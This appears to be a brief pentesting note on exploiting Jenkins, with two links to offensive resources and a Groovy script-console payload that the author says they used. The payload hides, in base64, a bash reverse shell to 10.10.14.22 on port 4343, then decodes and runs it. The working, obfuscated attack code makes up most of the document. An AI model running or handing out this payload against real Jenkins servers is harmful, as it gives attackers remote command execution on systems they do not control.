Good resources for testing Jenkins
https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#code-execution
https://github.com/gquere/pwn_jenkins

Payload I used:
```groovy
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```